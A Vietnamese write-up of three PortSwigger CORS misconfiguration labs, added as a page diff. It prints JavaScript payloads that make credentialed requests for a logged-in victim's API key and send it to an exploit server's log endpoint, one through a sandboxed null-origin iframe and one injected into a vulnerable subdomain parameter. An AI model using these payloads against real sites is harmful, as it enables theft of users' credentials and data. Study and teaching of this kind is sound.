@@ -1,0 +1,172 @@
+---
+title: "CORS Labs — PortSwigger Web Security Academy"
+description: "Hướng dẫn giải chi tiết các bài lab về lỗ hổng CORS trên PortSwigger — từ cấu hình sai phản chiếu origin cơ bản, tin tưởng nguồn gốc rỗng (null origin), đến khai thác thông qua giao thức không an toàn và lỗ hổng trên subdomain."
+date: "2026-05-03"
+category: "writeup"
+tags: ["cors", "web-security", "writeup", "portswigger", "html-injection"]
+thumbnail: ""
+external_link: ""
+---
+
+## Lab 1: CORS vulnerability with basic origin reflection
+Trang web cung cấp cơ chế update gmail của người dùng đang đăng nhập, và API key của họ.
+
+![image1.png](/images/writeups/lab-cors/image1.png)
+
+Mục tiêu của ta là lấy được API key của một người dùng bất kỳ khi họ đăng nhập, và gửi API key đó về máy chủ khai thác của ta.
+Sau khi đăng nhập , ta thấy có một endpoint nhạy cảm có response là API key của ta (wiener). Trường cookie có chứa session chứng tỏ rằng request này đang thực hiện dưới danh nghĩa một người dùng đã đăng nhập.
+
+![image2.png](/images/writeups/lab-cors/image2.png)
+
+Ta sẽ thực hiện kiểm thử lỗ hổng CORS Misconfiguration bằng cách thêm trường Origin với giá trị test https://example.com, sau đó gửi lại request trên thông qua repeater.
+
+![image3.png](/images/writeups/lab-cors/image3.png)
+
+Một điều dị thường đã xảy ra ! Trong phản hồi xuất hiện trường Access-Control-Allow-Origin với giá trị là https://example.com, điều này cho thấy Server lấy đúng giá trị từ tiêu đề Origin của bạn và phản hồi ngược lại, điều này cho thấy server đang tin tưởng và cho phép url https://example.com đọc giá trị của nó.
+Thông thường thì SOP ( Same Origin Policy ) sẽ ngăn chặn hành động này trừ khi server cho phép.
+Ngoài ra, trường Access-Control-Allow-Credentials với giá trị True chứng tỏ trang web cho phép JS từ trang https://example.com đọc dữ liệu của server kèm theo cookie định danh của nạn nhân. Đây là lỗi cấu hình sai CORS ( CORS Misconfiguration ).
+Vậy ta sẽ thực hiện khai thác bằng cách code một đoạn JS để lấy được API Key của nạn nhân khi họ ấn vào link này ( thông qua fishing ) ở trạng thái đang đăng nhập.
+
+```html
+<script>
+// Khởi tạo đối tượng để gửi yêu cầu HTTP ngầm từ trình duyệt
+var req = new XMLHttpRequest();
+// Thiết lập: Khi nhận được phản hồi thành công sẽ gọi hàm 'reqListener'
+req.onload = reqListener;
+// Cấu hình: Gửi yêu cầu GET tới endpoint chứa thông tin nhạy cảm của nạn nhân
+req.open('get','https://0a52009003e229d1802fb23a00c90075.web-security-academy.net/accountDetails',true);
+// QUAN TRỌNG: Ép trình duyệt gửi kèm Cookie phiên làm việc (Session) của nạn nhân
+req.withCredentials = true;
+// Thực thi gửi yêu cầu đi
+req.send();
+// Hàm xử lý sau khi lấy trộm được dữ liệu
+function reqListener() {
+// Lấy nội dung nhạy cảm (responseText) gửi về máy chủ của kẻ tấn công qua URL log
+location='/log?key='+this.responseText;
+};
+</script>
+```
+
+![image4.png](/images/writeups/lab-cors/image4.png)
+
+Đoạn scripts này sẽ lấy API Key của nạn nhân và gửi nó về endpoint /log của máy chủ khai thác.
+
+![image5.png](/images/writeups/lab-cors/image5.png)
+
+Trong /log, ta đã thấy thông tin của nạn nhân được gửi về máy chủ, thực hiện url decode ta sẽ thu được API Key và hoàn thành bài lab này.
+
+![image6.png](/images/writeups/lab-cors/image6.png)
+
+
+![image7.png](/images/writeups/lab-cors/image7.png)
+
+## Lab 2: CORS vulnerability with trusted null origin
+Ở challenge này, mục tiêu của ta vẫn là lấy được API Key của nạn nhân thông qua CORS vulnerability. Trang web được thiết kế giống hệt challenge trước.
+Nhưng ở ta send resquest đã them trường Origin: https://example.com tại endpoint /accountDetails thông qua repeater như challenge trước thì trong phản hồi lại không có trường Access-Control-Allow-Origin.
+
+![image8.png](/images/writeups/lab-cors/image8.png)
+
+Điều này rất có thể là do server đã filter bằng white list, chỉ cho phép ta đọc dữ liệu của server từ mội số origin nhất định !
+Vậy điều gì sẽ xảy ra với giá trị NULL ?. Thử nghiệm điều này bằng cách nhập NULL trong origin của request.
+
+![image9.png](/images/writeups/lab-cors/image9.png)
+
+Lần này server lại reflect lại bằng ACAO: null, cho thấy ta đã bypass đc white list, server lần này đã tin tưởng những origin không xác định ( NULL ).
+Từ đây, ta sẽ thực hiện viết mã khai thác, ở đây ta sẽ sử dụng iframe với thuộc tính sandbox một yêu cầu XHR/Fetch ra bên ngoài. Nội dung trong iframe được mặc định là đến từ một nguồn không xác định, khi đó , trình duyện sẽ gán origin = null vào request này ( đúng với điều kiện khai thác ) mặc cho chúng ta gửi thông tin ra bất cứ origin nào ( ở đây là máy chủ khai thác ).
+
+```html
+<!-- Ép trình duyệt tạo nguồn gốc rỗng (Origin: null) bằng Sandbox Iframe -->
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
+<script>
+// Khởi tạo yêu cầu HTTP ngầm
+var req = new XMLHttpRequest();
+// Gán hàm xử lý khi lấy được dữ liệu thành công
+req.onload = reqListener;
+// Nhắm mục tiêu vào endpoint chứa thông tin nhạy cảm của nạn nhân
+req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+// QUAN TRỌNG: Gửi kèm Cookie/Phiên đăng nhập của nạn nhân
+req.withCredentials = true;
+// Thực thi gửi yêu cầu
+req.send();
+// Hàm thu hoạch dữ liệu (Exfiltration)
+function reqListener() {
+// Đẩy dữ liệu nhạy cảm thu được về máy chủ kẻ tấn công qua URL log
+location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
+};
+</script>">
+</iframe>
+```
+
+![image10.png](/images/writeups/lab-cors/image10.png)
+
+Gửi đoạn iframe này cho nạn nhân ( thông qua fishing ). Sau đó truy cập /log của máy chủ khai thác. Ta thấy có dữ liệu dược gửi về.
+
+![image11.png](/images/writeups/lab-cors/image11.png)
+
+Thực hiện URL decode, ta sẽ tìm được API Key và hoàn thành bài lab này !
+
+![image12.png](/images/writeups/lab-cors/image12.png)
+
+
+![image13.png](/images/writeups/lab-cors/image13.png)
+
+## Lab 3: CORS vulnerability with trusted insecure protocols
+Ở thử thách này, mục tiêu vẫn là lấy được API Key của nạn nhân. Nhưng khi ta gửi request với origin = null thì đã không thu được kết quả gì khả quan.
+
+![image14.png](/images/writeups/lab-cors/image14.png)
+
+Trang web đã chặn một origin bất kì của ta và cả NULL. Vậy còn những origin nào khác mà ta có thể sử dụng ?
+Ta sẽ thử với testcase subdomain với payload origin = subdomain. ID_LAB.web-security-academy.net
+
+![image15.png](/images/writeups/lab-cors/image15.png)
+
+Vậy là server đã reflect lại origin này, điều này cho thấy server đã tin tưởng mọi subdomain của ID_LAB. web-security-academy.net mà ta truyền vào ( miễn là origin kết thúc bằng . web-security-academy.net thì sẽ tin tưởng ). Ta có thể thử lại cho chắc bằng một subdomain khác.
+
+![image16.png](/images/writeups/lab-cors/image16.png)
+
+Vậy mục tiêu tiếp theo là xác định xem trang web này có những subdomain nào cho phép ta thực thi được JS ( hay HTML ) không ?.
+Sau khi rà soát, ta phát hiện một subdomain ở chức năng kiểm tra tồn kho mang tên stock.
+
+![image17.png](/images/writeups/lab-cors/image17.png)
+
+Vậy ta sẽ test xem subdomain này có bị HTML injection không bằng payload đơn giản -> `<h1>aaa</h1>`
+
+![image18.png](/images/writeups/lab-cors/image18.png)
+
+Vậy là subdomain này đã bị HTML injection.
+Tiếp theo, ta sẽ viết mã khai thác tương tự như các challenge trước. Nhưng đoạn scripts này sẽ được thực thi thông qua parameter productId của subdomain stock, ta sẽ inject nó vào thông qua document.location của JS.
+Đây là đoạn mã lấy dữ liệu từ server và gửi về /log của máy chủ khai thác:
+
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + btoa(this.responseText);
+};
+</script>
+```
+
+Đoạn mã trên sẽ được chèn vào parameter productId:
+
+```html
+<script>
+document.location = "http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
+![image19.png](/images/writeups/lab-cors/image19.png)
+
+Gửi url này cho nạn nhân, sau đó truy cập vào /log, ta sẽ thấy dữ liệu từ nạn nhân được gửi về
+
+![image20.png](/images/writeups/lab-cors/image20.png)
+
+Thực hiện url decode, ta sẽ lấy được API Key và hoàn thành bài lab.
+
+![image21.png](/images/writeups/lab-cors/image21.png)
+
+
+![image22.png](/images/writeups/lab-cors/image22.png)
